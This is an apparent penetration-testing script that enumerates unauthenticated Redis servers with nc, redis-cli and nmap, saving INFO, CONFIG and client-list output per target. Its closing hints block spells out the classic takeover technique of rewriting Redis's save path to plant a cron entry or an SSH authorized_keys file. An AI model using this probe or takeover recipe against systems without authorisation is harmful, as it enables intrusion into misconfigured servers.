#!/usr/bin/env bash
# enum-redis.sh — unauthenticated Redis info / config probe.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "redis: $(wc -l < "$TARGETS") targets -> $OUT"

probe() {
    ip="$1"; port="$2"
    mkdir -p "$OUT/$ip"
    # Use plain TCP — Redis protocol is simple text
    {
        printf "INFO\r\nQUIT\r\n" | timeout 5 nc -nv "$ip" "$port" 2>&1
    } > "$OUT/$ip/info_${port}.txt" || true
    {
        printf "CONFIG GET dir\r\nCONFIG GET dbfilename\r\nQUIT\r\n" | timeout 5 nc -nv "$ip" "$port" 2>&1
    } > "$OUT/$ip/config_${port}.txt" || true
    {
        printf "CLIENT LIST\r\nQUIT\r\n" | timeout 5 nc -nv "$ip" "$port" 2>&1
    } > "$OUT/$ip/clients_${port}.txt" || true
}

if have redis-cli; then
    while read -r target; do
        [ -z "$target" ] && continue
        read -r ip port <<< "$(split_ipport "$target")"
        mkdir -p "$OUT/$ip"
        redis-cli -h "$ip" -p "$port" -t 5 INFO > "$OUT/$ip/redis-cli_${port}.txt" 2>&1 || true
        redis-cli -h "$ip" -p "$port" -t 5 CLIENT LIST >> "$OUT/$ip/redis-cli_${port}.txt" 2>&1 || true
    done < "$TARGETS"
else
    miss "redis-cli not installed — falling back to raw TCP"
    while read -r target; do
        [ -z "$target" ] && continue
        read -r ip port <<< "$(split_ipport "$target")"
        probe "$ip" "$port"
    done < "$TARGETS"
fi

# nmap redis-info
if have nmap; then
    IPS=$(ips_only "$TARGETS")
    nmap -Pn $(nmap_bound_args) -p6379 --script redis-info -iL <(echo "$IPS") \
        -oA "$OUT/nmap-redis" >/dev/null 2>&1 || true
fi

cat > "$OUT/_hints.txt" <<'EOF'
If unauth + writeable filesystem (dir=/var/lib/redis dbfilename=dump.rdb), classic vector:
    CONFIG SET dir /var/spool/cron/
    CONFIG SET dbfilename root
    SET x "\n* * * * * id > /tmp/p\n"
    SAVE
Or write authorized_keys to ~redis/.ssh/.
EOF

log "redis dispatcher done."
